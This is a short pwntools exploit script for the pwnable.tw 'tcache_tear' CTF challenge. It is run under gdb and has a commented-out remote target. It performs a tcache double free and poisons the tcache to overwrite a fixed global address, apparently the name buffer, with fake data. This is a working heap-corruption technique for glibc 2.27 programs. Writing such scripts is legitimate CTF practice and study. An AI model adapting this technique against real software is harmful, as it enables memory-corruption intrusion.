#!/usr/bin/env python3

from pwn import *

exe = ELF("tcache_tear_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")

# main:     0x400bc7
# allocate: 0x400b14

p = gdb.debug('./tcache_tear_patched', gdbscript='''
	b * 0x400bc7
	b * 0x400b14
	b * 0x400b99
  continue
''')
#p = process('./tcache_tear_patched')
#p = remote('chall.pwnable.tw', 10207)

def Malloc(size, data):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendlineafter(b'Size:', size)
	p.sendafter(b'Data:', data)

def Free():
	p.sendlineafter(b'Your choice :', b'2')

def Info():
	p.sendlineafter(b'Your choice :', b'3')
	

# Setup - Name input
p.sendlineafter(b'Name:', b'AAAAAAAA')

# Double Free into tcache
Malloc(b'32', b'BBBB')
Free()
Free()

print("[*] Double Free")

Malloc(b'32', b'\x60\x20\x60\x00')
Malloc(b'32', b'BBBB')

Info()

Malloc(b'32', b'FAKE NAME')

Info()

p.interactive()
